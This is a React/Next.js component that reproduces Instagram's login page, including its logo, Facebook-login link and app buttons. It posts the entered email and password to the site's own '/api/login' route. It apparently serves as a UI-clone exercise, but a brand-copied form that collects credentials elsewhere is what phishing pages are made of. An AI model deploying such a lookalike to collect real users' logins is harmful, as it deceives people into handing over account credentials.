"use client";

import React from "react";
import "./globals.css";
import axios from "axios";
import { Eye, EyeOff } from "lucide-react";

export default function Home() {
  const [showPassword, setShowPassword] = React.useState(false);

  const [data, setData] = React.useState({
    email: "",
    password: "",
  });

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await axios.post("/api/login", data);
      console.log(response.data);
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <main className="flex align-items-center justify-content-center">
      {/* Mobile Image */}

      {/* Auth Section */}
      <section id="auth" className="flex direction-column">
        <div className="panel login flex direction-column">
          <h1 title="Instagram" className="flex justify-content-center">
            <img src="/img/instagram-logo.png" alt="Instagram logo" />
          </h1>

          <form onSubmit={handleSubmit}>
            <input
              name="email"
              value={data.email}
              onChange={(e) => setData({ ...data, email: e.target.value })}
              placeholder="Phone number, username, or email"
            />

            {/* Password */}
            <div className="password-box">
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                value={data.password}
                onChange={(e) => setData({ ...data, password: e.target.value })}
                placeholder="Password"
              />

              <button
                type="button"
                className="eye-btn"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>

            <button type="submit">Log In</button>
          </form>

          {/* Separator */}
          <div className="flex separator align-items-center">
            <span></span>

            <div className="or">OR</div>

            <span></span>
          </div>

          {/* Facebook Login */}
          <div className="login-with-fb flex direction-column align-items-center">
            <div>
              <img src="/img/facebook-icon.jpg" alt="facebook" />

              <a href="#">Log in with Facebook</a>
            </div>

            <a href="#">Forgot password?</a>
          </div>
        </div>

        {/* Register */}
        <div className="panel register flex justify-content-center">
          <p>Don't have an account?</p>

          <a href="#">Sign up</a>
        </div>

        {/* App Download */}
        <div className="app-download flex direction-column align-items-center">
          <p>Get the app.</p>

          <div className="flex justify-content-center">
            <img src="/img/apple-button.png" alt="Apple Store" />

            <img src="/img/googleplay-button.png" alt="Google Play" />
          </div>
        </div>
      </section>
    </main>
  );
}
